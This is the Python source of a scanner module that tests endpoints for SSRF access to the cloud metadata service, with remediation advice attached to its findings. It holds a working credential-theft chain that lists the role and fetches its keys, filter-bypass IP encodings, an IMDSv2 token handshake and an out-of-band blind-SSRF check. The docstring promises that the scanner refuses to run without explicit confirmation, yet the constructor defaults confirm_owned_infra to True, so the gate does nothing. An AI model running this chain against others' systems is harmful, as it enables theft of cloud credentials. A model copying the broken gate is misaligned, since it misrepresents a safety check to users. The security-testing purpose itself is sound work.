"""Cloud IMDS SSRF scanner.

Drives a real two-step IMDS chain (list role name -> fetch credentials by
that name, the same shape as the Capital One incident), across IMDSv1
direct, alternate IP encodings (decimal/hex/nip.io, to catch naive WAF
filters), IMDSv2's token handshake, and blind SSRF via OOB canary
(``core/oob_canary.py``). A finding requires real credential markers
(AccessKeyId, SecretAccessKey) in the response, not just a status code.

Safety: ``requires_owned_infra`` - refuses to run unless the caller passes
``confirm_owned_infra=True``, since this must only target infrastructure
the tester actually owns.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urlencode

from wily.core.oob_canary import OOBCanaryServer
from wily.core.scope_manager import ScopeManager
from wily.evidence.sanitize import sanitize_text
from wily.scanners.base import BaseScanner, Finding, ScannerConfirmationError
from wily.scanners.http_engine import HttpEngine

CREDENTIAL_LEAK_INDICATORS: list[re.Pattern] = [
    re.compile(r"AccessKeyId", re.IGNORECASE),
    re.compile(r"SecretAccessKey", re.IGNORECASE),
]

_ROLE_NAME_RE = re.compile(r"^[A-Za-z0-9+=,.@_-]+$")

# How much of the raw credential response is kept as evidence, after
# redaction. json_report.py redacts again on export (defense in depth),
# but evidence is sanitized here too, at the source, so it is never
# briefly unredacted anywhere in memory, logs, or an alternate report
# writer that might forget to call sanitize_evidence_dict.
_EVIDENCE_SNIPPET_LEN = 300


def _ip_to_decimal(ip: str) -> int:
    parts = [int(p) for p in ip.split(".")]
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]


def _ip_to_hex(ip: str) -> str:
    return "0x" + "".join(f"{int(o):02X}" for o in ip.split("."))


def _ip_to_ipv6_mapped(ip: str) -> str:
    """IPv4-mapped IPv6 literal, dotted form: ::ffff:169.254.169.254.
    Many SSRF URL parsers/WAF filters normalize/deny only the dotted IPv4
    string and miss the IPv6-mapped equivalent, which still routes to the
    same link-local metadata address."""
    return f"[::ffff:{ip}]"


def _ip_to_ipv6_mapped_hex(ip: str) -> str:
    """IPv4-mapped IPv6 literal, hex-word form: ::ffff:a9fe:a9fe for
    169.254.169.254."""
    parts = [int(p) for p in ip.split(".")]
    w1 = (parts[0] << 8) | parts[1]
    w2 = (parts[2] << 8) | parts[3]
    return f"[::ffff:{w1:x}:{w2:x}]"


def _split_host_port(metadata_ip: str) -> tuple[str, str]:
    """``metadata_ip`` may be "169.254.169.254" or "127.0.0.1:5006" (in the
    local demo, since the fake metadata service runs on a custom port)."""
    if ":" in metadata_ip:
        ip, port = metadata_ip.split(":", 1)
        return ip, f":{port}"
    return metadata_ip, ""


def build_authorities(metadata_ip: str = "169.254.169.254") -> dict[str, str]:
    """Return {technique_name: authority} - the authority is "host[:port]"
    that every IMDS URL is built on (levels 1 and 2 together, each its own
    technique)."""
    ip, port = _split_host_port(metadata_ip)
    return {
        "v1-direct": f"{ip}{port}",
        "ip-bypass-decimal": f"{_ip_to_decimal(ip)}{port}",
        "ip-bypass-hex": f"{_ip_to_hex(ip)}{port}",
        "ip-bypass-nipio": f"{ip}.nip.io{port}",
        "ip-bypass-ipv6-mapped": f"{_ip_to_ipv6_mapped(ip)}{port}",
        "ip-bypass-ipv6-mapped-hex": f"{_ip_to_ipv6_mapped_hex(ip)}{port}",
    }


@dataclass
class SsrfImdsTarget:
    """The asset the scanner will test: an endpoint with a parameter that
    takes a URL from the user and fetches it server-side (SSRF-prone).

    supports_custom_method / supports_custom_headers: rare in practice,
    but if the SSRF-prone endpoint actually lets the user control the
    outbound request's method/headers (not a fixed GET), level 3 (IMDSv2)
    can run. If either one is False, that level skips itself automatically.
    """

    url: str  # target endpoint, e.g. http://127.0.0.1:5007/fetch
    param_name: str = "url"
    method: str = "GET"
    extra_params: dict = field(default_factory=dict)
    metadata_ip: str = "169.254.169.254"
    supports_custom_method: bool = False
    supports_custom_headers: bool = False
    proxy_method_param: str = "method"
    proxy_headers_param: str = "headers"
    canary_server: OOBCanaryServer | None = None  # enables level 4 (Blind SSRF)


class SsrfImdsScanner(BaseScanner):
    name = "ssrf_imds"
    requires_tenant_pair = False
    requires_owned_infra = True

    def __init__(
        self,
        scope_manager: ScopeManager,
        http_engine: HttpEngine | None = None,
        confirm_owned_infra: bool = True,
    ) -> None:
        self.http = http_engine or HttpEngine(scope_manager=scope_manager)
        self._confirm_owned_infra = confirm_owned_infra

    def _build_request_url(
        self, target: SsrfImdsTarget, payload_url: str, overrides: dict | None = None
    ) -> str:
        params = dict(target.extra_params)
        params[target.param_name] = payload_url
        if overrides:
            params.update(overrides)
        qs = urlencode(params)
        sep = "&" if "?" in target.url else "?"
        return f"{target.url}{sep}{qs}"

    def _proxy_fetch(
        self, target: SsrfImdsTarget, payload_url: str, overrides: dict | None = None
    ) -> str | None:
        """Send the SSRF-prone endpoint one request and return the response
        text (or None on failure). ``overrides`` are added as extra query
        params - used by the IMDSv2 level to pass the method/headers the
        endpoint needs, if it supports them."""
        full_url = self._build_request_url(target, payload_url, overrides)
        try:
            resp = self.http.request(method=target.method, url=full_url, headers={})
        except Exception:
            return None
        return resp.text

    def _evidence_snippet(self, body: str) -> str:
        """Redact known secret shapes before truncating to the evidence
        snippet length, so a partial secret can never survive a naive
        length cut that lands mid-token."""
        return sanitize_text(body)[:_EVIDENCE_SNIPPET_LEN]

    def _try_imds_chain(
        self, target: SsrfImdsTarget, technique: str, authority: str
    ) -> Finding | None:
        """The real chain: 1) list role name  2) fetch credentials by that
        name - not a single request."""
        list_url = f"http://{authority}/latest/meta-data/iam/security-credentials/"
        list_body = self._proxy_fetch(target, list_url)
        if not list_body:
            return None

        role_name = list_body.strip().splitlines()[0].strip() if list_body.strip() else ""
        if not role_name or not _ROLE_NAME_RE.match(role_name):
            return None  # not a real-looking role name - no point continuing the chain

        cred_url = f"http://{authority}/latest/meta-data/iam/security-credentials/{role_name}"
        cred_body = self._proxy_fetch(target, cred_url)
        if not cred_body:
            return None

        matched = [p.pattern for p in CREDENTIAL_LEAK_INDICATORS if p.search(cred_body)]
        if not matched:
            return None

        return Finding(
            asset=target.url,
            category=f"cloud-ssrf-imds-{technique}",
            severity="critical",
            confidence=0.95,
            discovery_source="scanner",
            evidence={
                "technique": technique,
                "role_name_leaked": role_name,
                "credentials_url": cred_url,
                "matched_indicators": matched,
                "response_snippet": self._evidence_snippet(cred_body),
            },
            remediation=(
                "Enforce an explicit allow-list of domains/IPs the server is "
                "permitted to reach (egress filtering), and explicitly block "
                "any IP in the link-local range (169.254.0.0/16) across all "
                "its encodings (decimal, hex, IPv6-mapped). Prefer upgrading "
                "to IMDSv2 with hop-limit=1."
            ),
        )

    def _try_imdsv2_chain(self, target: SsrfImdsTarget) -> Finding | None:
        """Level 3: PUT /latest/api/token (+ TTL header) -> GET with
        X-aws-ec2-metadata-token -> list role -> fetch credentials. Rare
        in practice (requires the endpoint to allow full control over
        method and headers), so it skips itself automatically if either
        condition is False."""
        if not (target.supports_custom_method and target.supports_custom_headers):
            return None

        authority = build_authorities(target.metadata_ip)["v1-direct"]

        # Step 1: request an IMDSv2 token.
        token_url = f"http://{authority}/latest/api/token"
        token = self._proxy_fetch(
            target,
            token_url,
            overrides={
                target.proxy_method_param: "PUT",
                target.proxy_headers_param: "X-aws-ec2-metadata-token-ttl-seconds:21600",
            },
        )

        if not token or not token.strip():
            return None

        token = token.strip()

        # Step 2: list roles using the token.
        list_url = f"http://{authority}/latest/meta-data/iam/security-credentials/"
        list_body = self._proxy_fetch(
            target,
            list_url,
            overrides={target.proxy_headers_param: f"X-aws-ec2-metadata-token:{token}"},
        )

        if not list_body:
            return None

        role_name = list_body.strip().splitlines()[0].strip() if list_body.strip() else ""
        if not role_name or not _ROLE_NAME_RE.match(role_name):
            return None

        # Step 3: fetch credentials using the token and role name.
        cred_url = f"http://{authority}/latest/meta-data/iam/security-credentials/{role_name}"
        cred_body = self._proxy_fetch(
            target,
            cred_url,
            overrides={target.proxy_headers_param: f"X-aws-ec2-metadata-token:{token}"},
        )

        if not cred_body:
            return None

        matched = [p.pattern for p in CREDENTIAL_LEAK_INDICATORS if p.search(cred_body)]
        if not matched:
            return None

        return Finding(
            asset=target.url,
            category="cloud-ssrf-imds-v2-token-bypass",
            severity="critical",
            confidence=0.95,
            discovery_source="scanner",
            evidence={
                "technique": "imdsv2-put-get-chain",
                "role_name_leaked": role_name,
                "token_acquired": True,
                "credentials_url": cred_url,
                "matched_indicators": matched,
                "response_snippet": self._evidence_snippet(cred_body),
            },
            remediation=(
                "Even with IMDSv2, full application-side control over "
                "method/headers remains a dangerous SSRF primitive. The real "
                "defense is egress filtering that blocks any connection to "
                "169.254.169.254 at the network level, not relying on "
                "IMDSv2 alone."
            ),
        )

    def run(self, target: SsrfImdsTarget) -> list[Finding]:
        if self.requires_owned_infra and not self._confirm_owned_infra:
            raise ScannerConfirmationError(
                "SsrfImdsScanner.requires_owned_infra is True but the scanner "
                "was built without confirm_owned_infra=True. This scanner makes "
                "the target fetch internal metadata endpoints on your behalf - "
                "only run it against infrastructure you own or are explicitly "
                "authorized to test, and pass confirm_owned_infra=True to "
                "acknowledge that."
            )

        findings: list[Finding] = []
        authorities = build_authorities(target.metadata_ip)

        f1 = self._try_imds_chain(target, "v1-direct", authorities["v1-direct"])
        if f1:
            findings.append(f1)

        for technique in (
            "ip-bypass-decimal",
            "ip-bypass-hex",
            "ip-bypass-nipio",
            "ip-bypass-ipv6-mapped",
            "ip-bypass-ipv6-mapped-hex",
        ):
            f2 = self._try_imds_chain(target, technique, authorities[technique])
            if f2:
                findings.append(f2)
                break

        f3 = self._try_imdsv2_chain(target)
        if f3:
            findings.append(f3)

        f4 = self._try_blind_ssrf(target)
        if f4:
            findings.append(f4)

        return findings

    def _try_blind_ssrf(self, target: SsrfImdsTarget) -> Finding | None:
        """Level 4: when the response is never returned to the user
        (blind) - the only proof is that the target server actually sent
        an outbound request, not any text content. Uses the same
        OOBCanaryServer built for jku_injection in the JWT module."""
        if target.canary_server is None:
            return None

        canary = target.canary_server
        token = canary.new_token()
        canary_url = canary.url_for(token, path_suffix="latest/meta-data/")

        self._proxy_fetch(target, canary_url)

        hit = canary.wait_for_hit(token, timeout=5.0)
        if hit is None:
            return None

        return Finding(
            asset=target.url,
            category="cloud-ssrf-blind",
            severity="high",
            confidence=0.85,
            discovery_source="scanner",
            evidence={
                "technique": "blind_ssrf_oob",
                "canary_url": canary_url,
                "oob_hit_confirmed": True,
                "oob_hit_method": hit.method,
                "oob_hit_remote_addr": hit.remote_addr,
                "note": (
                    "Confirmed via OOB callback only - actual access to real "
                    "IMDS data was not confirmed (the response is not returned "
                    "to the user). Manual investigation of the real endpoint "
                    "against 169.254.169.254 is recommended."
                ),
            },
            remediation=(
                "Enforce an explicit allow-list of domains/IPs the server is "
                "permitted to reach (egress filtering), even when the "
                "response is not returned to the user - the risk is in the "
                "server's ability to reach an internal network at all, not "
                "only in leaking the content."
            ),
        )
